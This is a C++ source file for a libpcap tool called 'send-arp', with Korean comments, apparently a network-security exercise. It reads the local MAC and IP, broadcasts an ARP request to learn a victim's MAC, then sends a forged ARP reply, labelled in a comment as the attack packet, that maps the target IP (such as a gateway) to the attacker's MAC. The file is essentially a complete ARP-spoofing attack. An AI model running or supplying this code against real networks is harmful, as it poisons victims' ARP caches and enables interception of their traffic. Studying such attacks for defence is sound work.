#include <stdio.h>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <string.h>
#include <string>
#include <arpa/inet.h> // inet_ntop()
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/socket.h>

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

EthArpPacket make_packet(string ether_smac, string ether_dmac, uint16_t op, string arp_smac, string arp_sip, string arp_tmac, string arp_tip) {
	EthArpPacket packet;

    packet.eth_.dmac_ = Mac(ether_dmac); // you mac
    packet.eth_.smac_ = Mac(ether_smac); // my mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(op); // Request = 1 or Reply = 2
    packet.arp_.smac_ = Mac(arp_smac); // my mac
    packet.arp_.sip_ = htonl(Ip(arp_sip)); // gateway ip
    packet.arp_.tmac_ = Mac(arp_tmac); // you mac
    packet.arp_.tip_ = htonl(Ip(arp_tip)); // you ip

	return packet;
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	string my_mac = "";
    string my_ip = "";
	unsigned char s_mac[32] = { 0, };
	string sender_ip = argv[2];
	string target_mac = "";
	string target_ip = argv[3];

	//cout << sender_ip << '\n';

	// 내 MAC Address, IP Address 알아내기
	unsigned char* mac_temp;
	char mac[32] = { 0, };

	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, argv[1], IFNAMSIZ - 1);
	ioctl(fd, SIOCGIFHWADDR, &ifr);
	
	mac_temp = (unsigned char*) ifr.ifr_hwaddr.sa_data;
	sprintf((char*)mac, (const char*)"%02x:%02x:%02x:%02x:%02x:%02x", mac_temp[0], mac_temp[1], mac_temp[2], mac_temp[3], mac_temp[4], mac_temp[5]);
	my_mac = mac;
	printf("My MAC Address : %s\n", my_mac.c_str());

	my_ip = inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr);
	printf("My IP Address : %s\n", my_ip.c_str());


	// sender의 MAC 주소를 얻기 위해 ARP 패킷 보내기
	// sender의 MAC 주소를 얻으려면, target ip = sender ip로 broadcast 해야 함.
	
	EthArpPacket packet1 = make_packet(my_mac, "ff:ff:ff:ff:ff:ff", 1, my_mac, my_ip, "ff:ff:ff:ff:ff:ff", sender_ip);

	while (1) {	
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet1), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

		struct pcap_pkthdr* header;
		const u_char* packet;
		int res2 = pcap_next_ex(handle, &header, &packet);

		struct ether_header* ether;
		ether = (struct ether_header*) packet;

		if(ether->ether_type == htons(0x0806)) {
			struct ether_arp* res_arp;
			res_arp = (struct ether_arp*) (packet + sizeof(ether_header));
			unsigned char sender_mac_temp[6];
			memcpy(sender_mac_temp, res_arp->arp_sha, sizeof(sender_mac_temp));
			sprintf((char*)s_mac, (const char*)"%02x:%02x:%02x:%02x:%02x:%02x",
			sender_mac_temp[0],
			sender_mac_temp[1],
			sender_mac_temp[2],
			sender_mac_temp[3],
			sender_mac_temp[4],
			sender_mac_temp[5]);
			break;
		}
	}

	string sender_mac = "";
	for (int i = 0; i < 21; i++) {
		sender_mac += s_mac[i];
	}
	printf("Sender MAC Address : %s\n", sender_mac.c_str());

	// Sender에게 공격 패킷 쏘기
	EthArpPacket packet2 = make_packet(my_mac, sender_mac, 2, my_mac, target_ip, sender_mac, sender_ip);

	int res3 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet2), sizeof(EthArpPacket));
	if (res3 != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res3, pcap_geterr(handle));
		return -1;
	}

	printf("Success!\n");

	pcap_close(handle);
}
